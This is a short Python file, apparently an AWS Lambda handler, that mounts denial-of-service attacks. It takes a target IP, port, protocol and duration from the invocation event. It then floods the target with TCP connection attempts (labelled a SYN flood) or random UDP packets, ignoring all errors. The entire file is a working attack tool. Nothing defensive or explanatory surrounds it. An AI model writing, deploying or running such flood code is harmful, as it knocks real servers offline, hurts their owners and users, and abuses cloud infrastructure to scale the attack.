##################################################
####### This is the code run on AWS Lambda #######
##################################################

import json
import socket
import random
import time
import sys

def lambda_handler(event, context):
    print(event['ip'])
    params = event['ip'].split()
    ip = params[0]
    port = int(params[1])
    protocol = params[2]
    time = int(params[3])
    
    if protocol == 'tcp':
        count = syn_flood(ip, port, time)
    else:
        count = udp_flood(ip, port, time)
    
    return {
        'statusCode': 200,
        'body': json.dumps(count)
    }
    
    
# Mounts a SYN flood DOS attack on specified target for a specified time
def syn_flood(target_ip, port, t):
	begin = time.time()
	count = 0

	# Loop to continuously send packets
	while True:

		end = time.time()

		# Check for attack lasting a specific length
		if end - begin > t:
			print("Sent %d SYN packets" % (count))
			return count

		# Send Packets
		try:
			count = count + 1
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, port))

		# Ignore exceptions from packet denial
		except:
			pass


# Mounts a UDP flood DOS attack on specified target for a specified time
def udp_flood(target_ip, port, t):
	
	begin = time.time()
	count = 0
	message = random._urandom(1024)


	# Loop to send packets
	while True:

		end = time.time()

		# Check for end time of attack
		if end - begin > t:
			print("Sent %d UDP packets" % (count))
			return count

		# Send UDP packet
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.sendto(message, (target_ip, port))
			count = count + 1
		except:
			pass
